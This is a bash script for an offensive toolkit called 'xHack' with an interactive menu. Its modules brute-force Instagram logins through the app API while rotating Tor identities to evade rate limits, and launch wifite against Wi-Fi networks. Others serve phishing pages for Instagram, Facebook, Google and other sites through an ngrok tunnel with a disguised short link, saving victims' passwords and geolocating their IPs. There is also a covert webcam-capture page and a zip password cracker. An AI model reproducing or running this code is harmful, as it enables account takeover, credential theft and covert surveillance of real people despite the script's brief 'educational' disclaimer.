#!/bin/bash
#coded by Fadester
#v1.6

green='\033[1;32m'
red='\e[1;91m'
yellow='\e[0m\e[1;93m'
lightgreen='\e[1;32m'
farblos='\e[0m'
BlueF='\e[1;34m'
cyan='\e[0;36m'
lightred='\e[101m'
blink='\e[5m'
magenta='\e[35m'

user="username"
wordlist="wordlist"
pwd=$(pwd)
pics=0
user_id=$(id -u)
if [[ $user_id == "1000" ]]; then
  echo -e $red You need to be root to run this script! $farblos
  exit 1
fi
clear


trap 'printf "\n";stop_xHack;exit 1' 2

stop_xHack() {

break > /dev/null 2>&1
echo -e "$green ------>$green Photos taken: $pics $farblos"
echo
sleep 0.5
echo -e "$green ------>$red Shutting down... $farblos"
sleep 5
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

}

banner() {
printf " \e[1;33m      \e[1;31m   _   _            _     \e[0m\n  "
printf " \e[1;33m __  _\e[1;31m| | | | ____  ___| | __ \e[0m\n  "
printf " \e[1;33m \ \/ /\e[1;31m |_| |/ _  |/ __| |/ / \e[0m\n  "
printf " \e[1;33m  >  <\e[1;31m|  _  | (_| | (__|   <  \e[0m\n  "
printf " \e[1;33m /_/\_\e[1;31m\_| |_|\____|\___|_|\_\ \e[0m\n  "
echo ""
echo -e "$magenta +++$BlueF------=[$green""coded by Fadester$BlueF]=------$magenta+++ $farblos"
echo -e "$magenta +++$BlueF------=[$green""      v1.6$BlueF       ]=------$magenta+++ $farblos"
echo ""
echo -e "$underlined$yellow .:.:.$green  Type help for help$yellow .:.:. $farblos"
echo
echo -e "$blink$red""DISCLAIMER $farblos"
echo -e "$lightred This tool was only written for educational purposes. Entering the privacy of others is illegal!$farblos"
}
show_modules() {
echo
echo -e "$green ------>$yellow      Modules                value   "
echo -e "$magenta              -------                ----- $farblos  "
echo ""
echo -e "$green ------>$BlueF     Hack insta Acc $red           1  $farblos "
echo ""
echo ""
echo -e "$green ------>$BlueF     Hack Wlan Key  $red           2  $farblos "
echo ""
echo ""
echo -e "$green ------>$BlueF     Phishing       $red           3  $farblos"
echo ""
echo ""
echo -e "$green ------>$BlueF     Access Webcam  $red           4  $farblos"
echo ""
echo ""
echo -e "$green ------>$BlueF     Crack Zip file $red           5  $farblos"
eingabe
}
hack_insta_options() {
echo ""
echo -e "$green ------>$yellow      options                value    "
echo "              -------                -----    "
echo ""
echo -e "$green ------> $BlueF   username $red              ${user:-   user}      "
echo ""
echo ""
echo -e "$green ------>   $BlueF wordlist           $red    ${wl_pass:-wordlist} $farblos     "
echo ""
hack_acc
}
crack_zip_options() {
echo ""
echo -e "$green ------>$yellow      options                value    "
echo "              -------                -----    "
echo ""
echo -e "$green ------> $BlueF      file $red              ${file:-   file}      "
echo ""
echo ""
echo -e "$green ------>   $BlueF  wordlist           $red    ${wordlist:-wordlist} $farblos     "
echo ""
echo ""
crack_zip
}
information() {
echo ""
echo -e "$green ------>$magenta coded by Fadester"
echo -e "$green ------>$magenta Follow me on"
echo -e "$green ------>$magenta github: https://github.com/Fadester"
echo -e "$green ------>$magenta instagram: Fadester_04"
echo -e "$green ------>$magenta snapchat: robinjoel04"
echo -e "$green ------>$magenta Twitter: Robin04"
echo -e "$green ------>$magenta Thank you for using xHack =) $farblos"
echo ""
}
changeip() {

  killall -HUP tor

}

check_tor() {

checktor=$(curl --socks5 localhost:9050 -s https://check.torproject.org > /dev/null)
echo $? > /dev/null 2>&1
if [[ $? -gt 0 ]]; then
echo -e "$green ------>$red Tor is not running! $farblos"
hack_acc
fi

}

hack_acc() {
  while [[ true ]]; do

echo -ne "\033[1;32m┌─[\e[0m\e[1;93mHackInsta\e[0m\033[1;32m]\033[1;32m─[\e[35mnoob\e[0m\033[1;32m]
\033[1;32m└──╼ \e[0;36m$ \e[1;91m"
read case1 case2 case3
if  [[ $case1 == "show" ]] && [[ $case2 == "options" ]]
then
  hack_insta_options
elif [[ $case1 == "set" ]]
  then
    if [[ $case2 == "username" ]] && [[ ! $case3 == "" ]]
      then
        user=$case3
    elif [[ $case2 == "wordlist" ]] && [[ ! $case3 == "" ]]
      then
        wl_pass=$case3
    fi
elif [[ $case1 == "show" ]] && [[ $case2 == "info" ]]
  then
    information
elif [[ $case1 == "clear" ]]
  then
  clear
  banner
  echo ""
elif [[ $case1 == "exit" ]]
  then
    eingabe
elif [[ $case1 == "start" ]]
then

check_tor

counter=0
turn=10
startline=1
endline=4

chars_wl=$(wc -w $wl_pass | cut -d " " -f1)
phone="$string8-$string4-$string4-$string4-$string12"
var2=$(echo $var | grep -o 'csrftoken=.*' | cut -d ';' -f1 | cut -d '=' -f2)
guid="$string8-$string4-$string4-$string4-$string12"
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
string4=$(openssl rand -hex 32 | cut -c 1-4)
string12=$(openssl rand -hex 32 | cut -c 1-12)
string8=$(openssl rand -hex 32  | cut -c 1-8)
string16=$(openssl rand -hex 32 | cut -c 1-16)
device="android-$string16"
printf "\n"
while [ "$counter" -lt 10 ]; do
for pass in $( sed -n ''$startline','$endline'p' $wl_pass); do

header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
IFS=$'\n'
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

printf "\e[0m\e[1;77m[\e[0m\e[1;92m!\e[0m\e[1;77m] Try pass: \e[0m\e[1;93m %s\e[0m\n" $pass


IFS=$'\n'
var=$(curl -c cookie.$user -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq );
if [[ $var == "challenge" ]]; then pw_found ; eingabe; elif [[ $var == "logged_in_user" ]]; then pw_found ; eingabe; elif [[ $var == "Please wait" ]]; then echo -e "$red Please wait $farblos" ; sleep 120 ; fi ;

let counter++
curl -c cookie.$user -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://instagram.com/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq
let startline+=1
let endline+=1
killall -HUP tor
done

let counter++

curl -c cookie.$user -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq
let startline+=4
let endline+=4
if [[ $startline == $chars_wl ]]; then
  echo -e  "$red Wordlist end! $farblos"
  hack_acc
fi
killall -HUP tor
done


  echo ""
  echo "   COMPLETE!"
  echo ""
  read -p "Do you want to do a second attack? [Y/N] " second
  echo ""
  if [[ $second == "y" ]];
  then
    hack_acc
  elif [[ $second == "Y" ]];
  then
    hack_acc
  elif [[ $second == "n" ]];
  then
    eingabe
  elif [[ $second == "N" ]];
  then
    eingabe
  else
    echo ""
    echo -e "$red invalid option $farblos"
    echo ""
fi
elif [[ $case1 == "help" ]]
then
echo ""
echo -e "$green ------>$magenta help = show this message"
echo -e "$green ------>$magenta show options = show requirements"
echo -e "$green ------>$magenta set username [user] = set username"
echo -e "$green ------>$magenta set wordlist [wordlist] = set wordlist"
echo -e "$green ------>$magenta start = start the attack"
echo -e "$green ------>$magenta clear = clear the window"
echo -e "$green ------>$magenta exit = go to main menu"
echo -e "$green ------>$magenta show info = show infortmations"
echo -e "$green ------>$red =D $farblos"
echo ""
else
	echo invalid command
	hack_acc
fi
done

}

pw_found() {
echo ""
echo -e "$BlueF>>>$yellow Password found! $BlueF<<< $farblos"
echo -e "$green----> Username: $red$user $farblos"
echo -e "$green----> Password: $red$pass $farblos"
echo ""
hack_acc
}
hack_wlan() {

echo -e "$red __      __.__                 $green   ___ ___                __     $farblos "
echo -e "$red/  \    /  \  | _____    ____  $green  /   |   \_____    ____ |  | __ $farblos "
echo -e "$red\   \/\/   /  | \__  \  /    \ $green /    ~    \__  \ _/ ___\|  |/ / $farblos "
echo -e "$red \        /|  |__/ __ \|   |  \ $green\    Y    // __ \\  \___|    <  $farblos "
echo -e " $red \__/\  / |____(____  /___|  / $green \___|_  /(____  /\___  >__|_ \ $farblos "
echo -e " $red      \/            \/     \/      $green   \/      \/     \/     \/     $farblos "
echo ""
xterm -T "  " -bg black -fg white -fa monaco -fs 9 -geometry 110x16-0+0 -e wifite
eingabe
}

phishing(){

while [[ true ]]; do
echo -ne "\033[1;32m┌─[\e[0m\e[1;93mphishing\e[0m\033[1;32m]\033[1;32m─[\e[35mnoob\e[0m\033[1;32m]
\033[1;32m└──╼ \e[0;36m$ \e[1;91m"

read case1 case2 case3

if [[ $case1 == set ]]
  then
    if [[ $case2 == site ]] && [[ ! $case3 = "" ]]
      then
        site=$case3
    fi
elif [[ $case1 == "show" ]] && [[ $case2 == "info" ]]
  then
    information
elif [[ $case1 == list ]] && [[ $case2 == sites ]];
  then
    echo
    echo -e "$green ------>$green instagram $farblos "
    echo -e "$green ------>$green snapchat $farblos "
    echo -e "$green ------>$green facebook $farblos "
    echo -e "$green ------>$green twitter $farblos "
    echo -e "$green ------>$green google $farblos"
    echo
elif [[ $case1 == "help" ]]
then
echo ""
echo -e "$green ------>$magenta help = show this message"
echo -e "$green ------>$magenta list sites = show all sites"
echo -e "$green ------>$magenta set site [site] = set site"
echo -e "$green ------>$magenta start = start the server"
echo -e "$green ------>$magenta clear = clear the window"
echo -e "$green ------>$magenta exit = go to main menu"
echo -e "$green ------>$magenta show info = show infortmations"
echo -e "$green ------>$red =D $farblos"
echo ""
elif [[ $case1 == "clear" ]]
  then
    clear
    banner
    echo ""
elif [[ $case1 == "exit" ]]
  then
    eingabe
elif [[ $case1 == start ]];
  then
    start1
else
  echo
	echo invalid command
  echo
  phishing
fi
done

}

start1() {

if [[ -e sendlink ]]; then
rm -rf sendlink
fi
start_site

}

start1_webcam() {

if [[ -e sendlink ]]; then
rm -rf sendlink
fi
start_webcam

}

start_site() {

if [[ -e sites/$site/ip.txt ]]; then
rm -rf sites/$site/ip.txt

fi
if [[ -e sites/$site/usernames.txt ]]; then
rm -rf sites/$site/usernames.txt

fi
if [[ -e ngrok ]]; then
echo ""
else
echo -e "$green ------>$BlueF Downloading Ngrok...$farblos"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
echo -e "$green ------>$red Download error... $farblos"
exit 1
fi

else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
echo -e "$green ------>$red Download error... $farblos"
exit 1
fi
fi
fi

echo -e "$green ------>$BlueF Starting php server... $farblos"
cd sites/$site && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
echo -e "$green ------>$BlueF Starting ngrok server... $farblos"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10
#ngrok url
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
#tinyurl
tinyurl=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$link" | head -n1)
echo -e "$green ------>$green Send this link to the Target:$red $link $farblos "
echo
echo -e "$green ------>$BlueF Or use tinyurl:$red $tinyurl $farblos "
found

}

start_webcam() {
echo
echo -e "$green ------>$green Photos saved > $pwd/sites/webcam $farblos"
if [[ -e sites/webcam/ip.txt ]]; then
rm -rf sites/webcam/ip.txt

fi

if [[ -e ngrok ]]; then
echo ""
else
echo -e "$green ------>$BlueF Downloading Ngrok...$farblos"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
echo -e "$green ------>$red Download error... $farblos"
exit 1
fi

else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
echo -e "$green ------>$red Download error... $farblos"
exit 1
fi
fi
fi

echo -e "$green ------>$BlueF Starting php server... $farblos"
cd sites/webcam && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
echo -e "$green ------>$BlueF Starting ngrok server... $farblos"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10
#ngrok url
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
#or using tinyurl
tinyurl=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$link" | head -n1)
echo -e "$green ------>$green Send this link to the Target:$red $link $farblos "
echo
echo -e "$green ------>$BlueF Or use tinyurl:$red $tinyurl $farblos"
payload_webcam
found_webcam

}

found_webcam() {
echo
echo -e "$green ------>$BlueF Waiting for IPs $farblos"
while [ true ]; do

if [[ -e "sites/webcam/ip.txt" ]]; then
echo ""
echo -e "$green ------>$green IP found! $farblos"
ip_webcam_found
echo ""
rm -rf sites/webcam/ip.txt
fi

sleep 0.5

if [[ -e sites/webcam/Log.log ]]; then
if [[ $pics == 0 ]]; then
echo -e "$blink$red CAMERA ACCESS GRANTED!!! $farblos\n"
fi
echo -e "$green ------>$yellow Photo was taken! $farblos"
let pics+=1
rm -rf sites/webcam/Log.log
sleep 0.5
fi
done
}

found() {

  echo -e ""
  echo -e "$green ------>$BlueF Waiting IPs and Credentials,$red Press Ctrl + C to exit... $farblos"
  echo ""
  while [ true ]; do


  if [[ -e "sites/$site/ip.txt" ]]; then
  echo -e "$green ------> IP Found! $farblos"
  echo ""
  ip_found
  rm -rf sites/$site/ip.txt
  fi
  sleep 0.5
  if [[ -e "sites/$site/usernames.txt" ]]; then
  echo -e "$green ------> Credentials Found! $farblos"
  echo ""
  catch_credentials
  rm -rf sites/$site/usernames.txt
  fi
  sleep 0.5


  done

}

ip_webcam_found() {

ip=$(grep -a 'IP:' sites/webcam/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
echo -e "$green ------>$green Target IP:$red $ip $farblos"
if [[ -e iptracker.log ]]; then
  rm -rf iptracker.log
fi
}

payload_webcam() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' sites/webcam/webcam.html > sites/webcam/index2.html
sed 's+forwarding_link+'$link'+g' sites/webcam/template.php > sites/webcam/index.php


}

ip_found() {

  ip=$(grep -a 'IP:' sites/$site/ip.txt | cut -d " " -f2 | tr -d '\r')
  IFS=$'\n'
  ua=$(grep 'User-Agent:' sites/$site/ip.txt | cut -d '"' -f2)
  echo -e "$green ------> Target IP:$red $ip $farblos"
  echo -e "$green ------> User-Agent:$red $ua $farblos"

  if [[ -e iptracker.log ]]; then
  rm -rf iptracker.log
  fi

  iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
  continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
  country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
  state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
  city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
  asnumber=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
  if [[ $continent != "" ]]; then
  echo -e "$green ------> IP Continent:$red $continent $farblos "
  fi
  country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
  if [[ $country != "" ]]; then
  echo -e "$green ------> IP Country:$red $country $farblos"
  fi
  state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
  if [[ $state != "" ]]; then
  echo -e "$green ------> State:$red $state $farblos "
  fi
  if [[ $city != "" ]]; then
  echo -e "$green ------> City Location:$red $city $farblos "
  fi
  if [[ $asnumber != "" ]]; then
  echo -e "$green ------> AS Number:$red $asnumber $farblos"
  fi
  echo -e ""
}

catch_credentials() {

account=$(grep -o 'Account:.*' sites/$site/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sites/$site/usernames.txt | cut -d ":" -f2)
echo -e "$green ------> Account:$red $account $farblos"
echo -e "$green ------> Password:$red$password $farblos "
echo "--------------------------------------------" >> saved.accounts.txt
echo "Site: $site" >> saved.accounts.txt
echo "IP: $ip" >> saved.accounts.txt
echo "Username: $account" >> saved.accounts.txt
echo "Password: $password" >> saved.accounts.txt
echo "--------------------------------------------" >> saved.accounts.txt
echo  >> saved.accounts.txt
echo -e "$green ------> Saved > saved.accounts.txt $farblos"
echo ""
echo -e "$green ------>$BlueF Waiting for next Credentials..., $red Press Ctrl + C to exit... $farblos"
}

crack_zip() {
while [[ true ]]; do

echo -ne "\033[1;32m┌─[\e[0m\e[1;93mCrack Zip\e[0m\033[1;32m]\033[1;32m─[\e[35mnoob\e[0m\033[1;32m]
\033[1;32m└──╼ \e[0;36m$ \e[1;91m"
read case1 case2 case3
if  [[ $case1 == "show" ]] && [[ $case2 == "options" ]]
  then
    crack_zip_options
elif [[ $case1 == "set" ]]
  then
    if [[ $case2 == "file" ]] && [[ ! $case3 == "" ]]
      then
        file=$case3
    elif [[ $case2 == "wordlist" ]] && [[ ! $case3 == "" ]]
      then
        wordlist=$case3
    fi
elif [[ $case1 == "show" ]] && [[ $case2 == "info" ]]
  then
    information
elif [[ $case1 == "clear" ]]
  then
    clear
    banner
    echo ""
elif [[ $case1 == "exit" ]]
  then
    eingabe
elif [[ $case1 == "start" ]]
  then 
    echo -e "$green ------>$BlueF Cracking.... $farblos$green"
    fcrackzip -D -p $wordlist -u $file
    echo ""
    echo -e "$green ------>$yellow DONE!"
    sleep 1.5
    eingabe
fi
done
}

eingabe() {
echo ""
read -p $'\033[1;32m┌─[\e[0m\e[1;93mxHack\e[0m\033[1;32m]\033[1;32m─[\e[35mnoob\e[0m\033[1;32m]
\033[1;32m└──╼ \e[0;36m$ \e[1;91m' eingabe

if [[ $eingabe == "show modules" ]];
then
	show_modules
elif [[ $eingabe == "use 1" ]];
then
	hack_acc
elif [[ $eingabe == "use 2" ]];
then
	hack_wlan
elif [[ $eingabe == "use 3" ]]; then
  phishing
elif [[ $eingabe == "use 4" ]]; then
  start_webcam
elif [[ $eingabe == "use 5" ]]; then
  crack_zip
elif [[ $eingabe == "help" ]];
then
echo ""
echo -e "$green ------>$magenta help = show this message"
echo -e "$green ------>$magenta use 'value' = go to 1,2,3...."
echo -e "$green ------>$magenta show modules = show all modules"
echo -e "$green ------>$magenta show info = show infortmations"
echo -e "$green ------>$magenta exit = exit xHack"
echo -e "$green ------>$red :D $farblos"
eingabe
elif [[ $eingabe == "show info" ]];
then
  information
  eingabe
elif [[ $eingabe == "clear" ]];
then
	clear
	banner
	eingabe
elif [[ $eingabe == "exit" ]];
then
  exit
else
	echo ""
	echo -e "$green ------>$red Invalid command $farblos "
	eingabe
fi
}

banner
eingabe
